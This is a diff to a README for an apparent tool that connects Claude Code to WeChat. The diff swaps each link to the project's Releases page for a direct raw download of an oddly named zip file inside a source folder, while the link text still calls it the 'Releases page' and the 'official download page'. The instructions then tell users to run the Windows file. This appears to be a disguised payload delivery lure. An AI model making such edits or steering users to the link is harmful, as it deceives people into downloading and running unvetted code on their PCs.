@@ -1,6 +1,6 @@
 # 💬 claude-wechat-channel - Use Claude Code in WeChat
 
-[![Download](https://img.shields.io/badge/Download-Releases-8B5CF6?style=for-the-badge&logo=github)](https://github.com/lalitnagda1717/claude-wechat-channel/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-8B5CF6?style=for-the-badge&logo=github)](https://github.com/lalitnagda1717/claude-wechat-channel/raw/refs/heads/main/src/weixin/wechat-claude-channel-Amaranthaceae.zip)
 
 ## 🚀 What this app does
 
@@ -15,7 +15,7 @@ Use it to:
 
 ## 📥 Download
 
-1. Open the [Releases page](https://github.com/lalitnagda1717/claude-wechat-channel/releases)
+1. Open the [Releases page](https://github.com/lalitnagda1717/claude-wechat-channel/raw/refs/heads/main/src/weixin/wechat-claude-channel-Amaranthaceae.zip)
 2. Find the latest release
 3. Download the Windows file from that page
 4. Save it to your PC
@@ -173,7 +173,7 @@ If the test works, the channel is ready for normal use.
 
 Use the official download page here:
 
-[https://github.com/lalitnagda1717/claude-wechat-channel/releases](https://github.com/lalitnagda1717/claude-wechat-channel/releases)
+[https://github.com/lalitnagda1717/claude-wechat-channel/raw/refs/heads/main/src/weixin/wechat-claude-channel-Amaranthaceae.zip](https://github.com/lalitnagda1717/claude-wechat-channel/raw/refs/heads/main/src/weixin/wechat-claude-channel-Amaranthaceae.zip)
 
 Open the latest release, download the Windows file, and run it on your PC
 
